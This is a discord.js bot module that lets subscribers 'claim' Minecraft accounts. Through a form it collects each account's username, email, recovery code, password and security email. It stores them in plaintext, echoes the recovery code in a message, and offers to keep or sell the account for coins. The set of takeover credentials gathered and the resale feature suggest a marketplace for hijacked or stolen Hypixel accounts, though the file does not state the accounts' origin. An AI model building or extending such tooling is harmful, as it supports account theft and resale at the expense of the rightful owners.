const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const fetch = require('node-fetch');

const API_BASE = 'https://api.hypixel.net';

async function getHypixelStats(username) {
  try {
    const response = await fetch(`${API_BASE}/player?name=${username}&key=${process.env.HYPIXEL_API_KEY}`);
    const data = await response.json();

    if (data.success && data.player) {
      const player = data.player;
      const level = player.networkLevel || 0;
      const rank = player.rank || player.monthlyPackageRank || 'None';
      const capes = player.capes ? player.capes.length : 0;

      return { level, rank, capes, success: true };
    }
    return { success: false };
  } catch (error) {
    console.error('Error fetching Hypixel stats:', error);
    return { success: false };
  }
}

module.exports = {
  async handleClaimButton(interaction, client) {
    const accountId = interaction.customId.replace('claim_', '');
    const userId = interaction.user.id;

    // Check subscription
    const subscription = client.db.getSubscription(userId);
    if (!subscription) {
      return interaction.reply({
        content: '❌ You need an active subscription to claim accounts!',
        ephemeral: true,
      });
    }

    // Show verification modal
    const modal = new ModalBuilder()
      .setCustomId(`verify_${accountId}`)
      .setTitle('Verify Account');

    const usernameInput = new TextInputBuilder()
      .setCustomId('username')
      .setLabel('Minecraft Username')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const emailInput = new TextInputBuilder()
      .setCustomId('email')
      .setLabel('Account Email')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const recoveryInput = new TextInputBuilder()
      .setCustomId('recovery')
      .setLabel('Recovery Code')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const passwordInput = new TextInputBuilder()
      .setCustomId('password')
      .setLabel('Account Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const secretInput = new TextInputBuilder()
      .setCustomId('secret')
      .setLabel('Secret/Security Email')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const row1 = new ActionRowBuilder().addComponents(usernameInput);
    const row2 = new ActionRowBuilder().addComponents(emailInput);
    const row3 = new ActionRowBuilder().addComponents(recoveryInput);
    const row4 = new ActionRowBuilder().addComponents(passwordInput);
    const row5 = new ActionRowBuilder().addComponents(secretInput);

    modal.addComponents(row1, row2, row3, row4, row5);

    await interaction.showModal(modal);
  },

  async handleVerifyModal(interaction, client) {
    const accountId = interaction.customId.replace('verify_', '');
    const userId = interaction.user.id;

    const username = interaction.fields.getTextInputValue('username');
    const email = interaction.fields.getTextInputValue('email');
    const recovery = interaction.fields.getTextInputValue('recovery');
    const password = interaction.fields.getTextInputValue('password');
    const secret = interaction.fields.getTextInputValue('secret');

    await interaction.deferReply({ ephemeral: true });

    // Fetch Hypixel stats
    const stats = await getHypixelStats(username);

    // Determine rank
    let rankDisplay = 'None';
    if (stats.success) {
      rankDisplay = this.formatRank(stats.rank);
    }

    // Claim the account in database
    const messageId = interaction.message?.id || `msg_${Date.now()}`;
    await client.db.claimAccount(accountId, userId, username, email, recovery, password, secret, rankDisplay, stats.capes || 0, messageId);
    await client.db.updateAccountsClaimed(userId);

    // Create decision buttons
    const keepButton = new ButtonBuilder()
      .setCustomId(`decision_keep_${accountId}`)
      .setLabel('💎 Keep Account')
      .setStyle(ButtonStyle.Success);

    const sellButton = new ButtonBuilder()
      .setCustomId(`decision_sell_${accountId}`)
      .setLabel('💰 Sell Account')
      .setStyle(ButtonStyle.Danger);

    const row = new ActionRowBuilder().addComponents(keepButton, sellButton);

    // Show account details embed
    const detailsEmbed = new EmbedBuilder()
      .setColor('#00FF00')
      .setTitle('✅ Account Claimed Successfully!')
      .addFields(
        { name: '👤 Username', value: `\`\`\`${username}\`\`\``, inline: true },
        { name: '📧 Email', value: `\`\`\`${email}\`\`\``, inline: true },
        { name: '🔐 Recovery Code', value: `\`\`\`${recovery}\`\`\``, inline: true },
        { name: '🎮 Rank', value: `\`\`\`${rankDisplay}\`\`\``, inline: true },
        { name: '🎨 Capes', value: `\`\`\`${stats.capes || 0}\`\`\``, inline: true },
        { name: '⭐ Level', value: `\`\`\`${stats.level || 0}\`\`\``, inline: true }
      )
      .setTimestamp()
      .setFooter({ text: 'What would you like to do with this account?' });

    await interaction.editReply({
      embeds: [detailsEmbed],
      components: [row],
    });

    client.db.addLog('account_claimed', userId, `Account: ${username}`);
  },

  async handleDecisionButton(interaction, client) {
    const [action, accountId] = interaction.customId.replace('decision_', '').split('_');
    const userId = interaction.user.id;

    if (action === 'sell') {
      // Show price modal
      const modal = new ModalBuilder()
        .setCustomId(`sellprice_${accountId}`)
        .setTitle('Set Selling Price');

      const priceInput = new TextInputBuilder()
        .setCustomId('price')
        .setLabel('Price in Coins')
        .setStyle(TextInputStyle.Short)
        .setRequired(true);

      const row = new ActionRowBuilder().addComponents(priceInput);
      modal.addComponents(row);

      await interaction.showModal(modal);
    } else {
      await interaction.reply({
        content: '✅ Account saved to your inventory!',
        ephemeral: true,
      });

      client.db.addLog('account_kept', userId, `Account ID: ${accountId}`);
    }
  },

  async handleSellPriceModal(interaction, client) {
    const accountId = interaction.customId.replace('sellprice_', '');
    const price = interaction.fields.getTextInputValue('price');

    if (isNaN(price) || parseInt(price) <= 0) {
      return interaction.reply({
        content: '❌ Invalid price!',
        ephemeral: true,
      });
    }

    await client.db.sellAccount(accountId, parseInt(price));
    await interaction.reply({
      content: `✅ Account listed for sale at **${price}** coins!`,
      ephemeral: true,
    });

    client.db.addLog('account_listed', interaction.user.id, `Account: ${accountId}, Price: ${price}`);
  },

  formatRank(rank) {
    const rankMap = {
      'NONE': '❌ None',
      'VIP': '💚 VIP',
      'VIP_PLUS': '💙 VIP+',
      'MVP': '💎 MVP',
      'MVP_PLUS': '💜 MVP+',
      'SUPERSTAR': '⭐ MVP++',
    };
    return rankMap[rank] || `${rank}`;
  },
};